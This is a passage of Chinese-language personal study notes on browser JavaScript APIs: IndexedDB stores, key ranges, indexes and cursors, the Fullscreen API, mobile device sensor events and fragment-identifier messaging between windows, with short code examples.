      var request = store.put(o, 1);
    .get()        读取数据 
      var ob = store.get(x); 
        参数是数据的键名
        var t = db.transaction(["test"], "readonly");
        var store = dbt.objectStore("test");
        var ob = store.get(x);
        get方法也是异步的,会触发自己的success和error事件,可以对它们指定回调函数.
          var ob = store.get(x);
          ob.onsuccess = function(e) {
            // ...
          }
    .delete(str)  删除数据 
      var t = db.transaction(["people"], "readwrite");
      var request = dbt.objectStore("people").delete(thisId);
      delete方法的参数是数据的键名.另外,delete也是一个异步操作,可以为它指定回调函数.
    .clear()   
    .getKey()   
    .getAll()  
    .getAllKeys()   
    .count()   
    .openCursor()  遍历数据 
      若想要遍历数据,就要openCursor方法,它在当前对象仓库里面建立一个读取光标(cursor).
      var t = db.transaction(["test"], "readonly");
      var store = dbt.objectStore("test");
      var cursor = store.openCursor();
      openCursor方法也是异步的,有自己的success和error事件,可以对它们指定回调函数.
        cursor.onsuccess = function(e) {
          var res = e.target.result;
          if(res) {
            console.log("Key", res.key);
            console.dir("Data", res.value);
            res.continue();
          }
        }
        回调函数接受一个事件对象作为参数,该对象的 target.result 属性指向当前数据对象.
        当前数据对象的 key 和 value 分别返回键名和键值[即实际存入的数据].
        continue 方法将光标移到下一个数据对象,
        若当前数据对象已经是最后一个数据了,则光标指向null.
      openCursor方法还可以接受第二个参数,表示遍历方向,默认值为next,
        其他可能的值为prev、nextunique和prevunique.
        后两个值表示若遇到重复值,会自动跳过.
    .openKeyCursor()  
    .index()  
    .createIndex()   创建索引
      假定对象仓库中的数据对象都是下面person类型的.
      var person = {
        name:name,
        email:email,
        created:new Date()
      }
      可以指定这个数据对象的某个属性来建立索引.
      var store = db.createObjectStore("people", { autoIncrement:true });
      store.createIndex("name","name", {unique:false});
      store.createIndex("email","email", {unique:true});
      createIndex方法接受三个参数,
      第一个是索引名称,
      第二个是建立索引的属性名,
      第三个是参数对象,用来设置索引特性.
      unique表示索引所在的属性是否有唯一值,上面代码表示name属性不是唯一值,email属性是唯一值.
    .deleteIndex()  
IDBKeyRange, 
  Extend: Object 
  Static: 
    .only()  
    .lowerBound()  
    .upperBound()  
    .bound()  
  Proto: 
    .lower 
    .upper 
    .lowerOpen 
    .upperOpen 
    .includes() 
  Example: 
    索引的有用之处,还在于可以指定读取数据的范围.
    这需要用到浏览器原生的IDBKeyRange对象.
    IDBKeyRange对象的作用是生成一个表示范围的Range对象.生成方法有四种:
    lowerBound方法:指定范围的下限.
    upperBound方法:指定范围的上限.
    bound方法:指定范围的上下限.
    only方法:指定范围中只有一个值.
    下面是一些代码实例:
    // All keys ≤ x  
    var r1 = IDBKeyRange.upperBound(x);
    
    // All keys < x  
    var r2 = IDBKeyRange.upperBound(x, true);
    
    // All keys ≥ y  
    var r3 = IDBKeyRange.lowerBound(y);
    
    // All keys > y  
    var r4 = IDBKeyRange.lowerBound(y, true);
    
    // All keys ≥ x && ≤ y  
    var r5 = IDBKeyRange.bound(x, y);
    
    // All keys > x &&< y  
    var r6 = IDBKeyRange.bound(x, y, true, true);
    
    // All keys > x && ≤ y  
    var r7 = IDBKeyRange.bound(x, y, true, false);
    
    // All keys ≥ x &&< y  
    var r8 = IDBKeyRange.bound(x, y, false, true);
    
    // The key = z  
    var r9 = IDBKeyRange.only(z);
    前三个方法(lowerBound、upperBound和bound)默认包括端点值,可以传入一个布尔值,修改这个属性.
    
    生成Range对象以后,将它作为参数输入openCursor方法,就可以在所设定的范围内读取数据.
    var t = db.transaction(["people"],"readonly");
    var store = dbt.objectStore("people");
    var index = store.index("name");
    
    var range = IDBKeyRange.bound('B', 'D');
    
    index.openCursor(range).onsuccess = function(e) {
      var cursor = e.target.result;
      if(cursor) {
        console.log(cursor.key + ":");
        for(var field in cursor.value) {
          console.log(cursor.value[field]);
        }
        cursor.continue();
      }
    }  
IDBIndex, 
  Extend: Object 
  Proto: 
    .name  
    .objectStore  
    .keyPath  
    .multiEntry  
    .unique  
    .get()  从对象仓库返回指定的索引 
      有了索引以后,就可以针对索引所在的属性读取数据.
      var t = db.transaction(["people"],"readonly");
      var store = dbt.objectStore("people");
      var index = store.index("name");
      var request = index.get(name);
      上面代码打开对象仓库以后,先用index方法指定索引在name属性上面,
      然后用get方法读取某个name属性所在的数据.
      若没有指定索引的那一行代码,get方法只能按照键名读取数据,
      而不能按照name属性读取数据.
      需要注意的是,这时get方法有可能取回多个数据对象,因为name属性没有唯一值.
      另外,get是异步方法,读取成功以后,只能在success事件的回调函数中处理数据.
    .getKey() 
    .getAll() 
    .getAllKeys() 
    .count() 
    .openCursor() 
    .openKeyCursor() 
IDBCursorWithValue, 
  Extend: IDBCursor 
  Proto: 
    .value 
IDBCursor, 
  Extend: Object 
  Proto: 
    .source 
    .direction 
    .key 
    .primaryKey 
    .advance() 
    .continue() 
    .continuePrimaryKey() 
    .update() 
    .delete() 
Fullscreen,全屏操作[HTML5] 
  PS: 全屏API可以控制浏览器的全屏显示,让一个Element节点[以及子节点]占满用户的整个屏幕
    目前各大浏览器的最新版本都支持这个API[包括IE11],但是使用的时候需要加上浏览器前缀
    放大一个节点时,Firefox和Chrome在行为上略有不同.
    Firefox自动为该节点增加一条CSS规则,将该元素放大至全屏状态,width:100%; height:100%,
    而Chrome则是将该节点放在屏幕的中央,保持原来大小,其他部分变黑.
    用户手动按下ESC键或F11键,也可以退出全屏键;
    加载新页面,或切换tab,或从浏览器转向其他应用[按下Alt-Tab],也会导致退出全屏状态;
  elem.requestFullscreen() 使该节点全屏
    PS:在Chrome/Firefox等浏览器中直接使用直接使元素节点全屏,会被拒绝
    function requestFullscreen(element) {
      if(element.requestFullscreen) {
        element.requestFullscreen();
      } 
      else if(element.mozRequestFullScreen) {
        element.mozRequestFullScreen();
      } 
      else if(element.msRequestFullscreen){
        element.msRequestFullscreen();
      } 
      else if(element.webkitRequestFullscreen) {
        element.webkitRequestFullScreen();
      }
      else {
        alert('该浏览器不支持全屏');
      }
    }
    requestFullscreen(document.documentElement);
    requestFullscreen(document.getElementById("videoElement"));
    为了让Chrome的行为与Firefox保持一致,可以自定义一条CSS规则.
      :-webkit-full-screen #myvideo {
        width: 100%;
        height: 100%;
      }
  document.exitFullscreen()  用于取消全屏[该方法也带有浏览器前缀]
    function exitFullscreen() {
      if (document.exitFullscreen) {
        document.exitFullscreen();
      } 
      else if (document.msExitFullscreen) {
        document.msExitFullscreen();
      } 
      else if (document.mozCancelFullScreen) {
        document.mozCancelFullScreen();
      } 
      else if (document.webkitExitFullscreen) {
        document.webkitExitFullscreen();
      }
    }
    exitFullscreen();
  document.fullscreenElement 返回正处于全屏状态的Element节点,
    PS:若当前没有节点处于全屏状态,则返回null.
    var fullscreenElement = document.fullscreenElement 
    || document.mozFullScreenElement 
    || document.webkitFullscreenElement;
  document.fullscreenEnabled 表示当前文档是否可以切换到全屏状态的布尔值
    var fullscreenEnabled = document.fullscreenEnabled 
    || document.mozFullScreenEnabled 
    || document.webkitFullscreenEnabled 
    || document.msFullscreenEnabled;
  fullscreenchange  浏览器进入或离开全屏时在document上触发事件
    document.addEventListener("fullscreenchange", function( event ) {
      if (document.fullscreenElement) {
        console.log('进入全屏');
      } 
      else {
        console.log('退出全屏');
      }
    });
  fullscreenerror   浏览器无法进入全屏时触发事件,可能是技术原因,也可能是用户拒绝
  全屏状态的CSS 
    全屏状态下,大多数浏览器的CSS支持:full-screen伪类,只有IE11支持:fullscreen伪类.
    使用这个伪类,可以对全屏状态设置单独的CSS属性.
    :-webkit-full-screen {
      /* properties */
    }
    :-moz-full-screen {
      /* properties */
    }

    :-ms-fullscreen {
      /* properties */
    }

    :full-screen { /*pre-spec */
      /* properties */
    }

    :fullscreen { /* spec */
      /* properties */
    }
    /* deeper elements */
    :-webkit-full-screen video {
      width: 100%;
      height: 100%;
    }
--------------------------------------------------------------------------------
移动端 
devicelight    设备屏幕亮度变化事件 [HTML5] 
  PS:移动设备的亮度传感器感知外部亮度发生显著变化时触发;目前,只有Firefox部署了该API
  var DLRun = function(event) { }
  window.addEventListener('devicelight',DLRun);
  event.value  亮度的流明值
  Example:  若亮度变强,网页显示黑底白字,若亮度变弱,网页显示白底黑字
    window.addEventListener('devicelight', function(e) {
      var lux = e.value;
      if(lux < 50) {
        document.body.className = 'dim';
      }
      if(lux >= 50 && lux <= 1000) {
        document.body.className = 'normal';
      }
      if(lux > 1000)  {
        document.body.className = 'bright';
      } 
    });
    CSS下一个版本的Media Query可以单独设置亮度,一旦浏览器支持,就可以用来取代Luminosity API.
    @media (light-level: dim) { /* 暗光环境 */ }
    @media (light-level: normal) { /* 正常光环境 */ }
    @media (light-level: washed) { /* 明亮环境 */ }
deviceorientation  设备摆放方向[竖放或横放]变化事件[HTML5] 
  PS:一旦设备的方向发生变化触发
  检测浏览器是否支持该API
    if (window.DeviceOrientationEvent) { /*  支持 */ } 
    else { /* 不支持 */ }
  window.addEventListener("deviceorientation", DORun);
  function DORun(event){ }
  event 
    PS:分别对应手机摆放的三维倾角变化.要理解它们,就要理解手机的方向模型.
      当手机水平摆放时,使用三个轴标示它的空间位置:x轴代表横轴、y轴代表竖轴、z轴代表垂直轴.
      event对象的三个属性就对应这三根轴的旋转角度.
    event.alpha  表示围绕z轴的旋转,从0到360度.      设备水平摆放时,alpha为0
    event.beta   表示围绕x轴的旋转,从-180 度到180度 设备水平摆放时,beta为0
    event.gamma 表示围绕y轴的选择,从-90 到90度      设备水平摆放时,gramma为0
orientationchange  在屏幕发生翻转时触发[HTML5] 
  window.orientation 设备的方向,0 表示竖直;90 表示右旋;-90 表示 左旋;
--------------------------------------------------------------------------待整理
  'fragment identifier'片段识别符 
    片段标识符指的是,URL的#号后面的部分,
    比如 'http://example.com/x.html#fragment'的#fragment.
    若只是改变片段标识符,页面不会重新刷新.
    父窗口可以把信息,写入子窗口的片段标识符.
    var src = originURL + '#' + data;
    document.getElementById('myIFrame').src = src;
    子窗口通过监听hashchange事件得到通知.
    window.onhashchange = checkMessage;
    function checkMessage() {
      var message = window.location.hash;
      // ...
    }r
    同样的,子窗口也可以改变父窗口的片段标识符.
    parent.location.href= target + “#” + hash;
    window.postMessage


